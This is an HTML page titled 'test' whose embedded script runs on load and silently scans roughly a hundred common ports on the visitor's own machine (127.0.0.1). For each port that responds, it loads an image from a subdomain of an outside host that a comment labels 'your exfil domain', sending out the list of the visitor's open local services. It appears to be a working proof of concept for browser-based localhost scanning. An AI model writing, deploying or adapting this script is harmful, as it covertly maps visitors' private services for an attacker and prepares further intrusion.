<html>
<head><title>test</title>
<script>
let host_root = "d0cprb40z4t67sqo9.xtric.homes"; // your exfil domain
//let a = Math.floor(Math.random() * 256);

//const top_ports = [
//  80, 443, 8080, 8000, 8888, 8443, 22, 21, 23, 25, 110, 143,
//  3306, 5432, 6379, 27017, 3389, 139, 445, 53, 389, 5900
//];

const top_ports = [
  21, 22, 23, 25, 53, 67, 68, 69, 80, 110, 111, 123, 135, 137, 138, 139, 143, 161, 162, 179,
  389, 443, 445, 465, 514, 515, 548, 554, 587, 631, 636, 993, 995, 1025, 1026, 1027, 1028, 1029, 1080, 1194,
  1234, 1433, 1434, 1521, 1723, 1900, 2049, 2082, 2083, 2222, 2375, 2376, 2483, 2484, 25565, 2601, 3128, 3306,
  3389, 3478, 3690, 4000, 4010, 4333, 4444, 4567, 5000, 5060, 5222, 5432, 5500, 5555, 5631, 5632, 5800, 5900,
  5984, 6000, 6001, 6379, 6660, 6661, 6666, 6667, 7000, 7070, 7443, 7777, 8000, 8008, 8080, 8081, 8086, 8088,
  8443, 8888, 9000, 9090, 9200, 9300, 9999, 10000, 11211, 27017
];


function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function scan() {
  //for (let b = 0; b < 256; b++) {
    for (let port of top_ports) {
      let ip = `127.0.0.1`;
      let url = `http://${ip}:${port}`;

      try {
        await fetch(url, {
          method: 'GET',
          mode: 'no-cors'
        });

        let img = new Image();
        img.src = `http://ip127-0-0-1-${port}.${host_root}`;
      } catch (e) {
        // Silent fail
      }

      await sleep(50); // throttle
    }
  //}
}

scan();

</script>
</head>
<body>
</body>
</html>
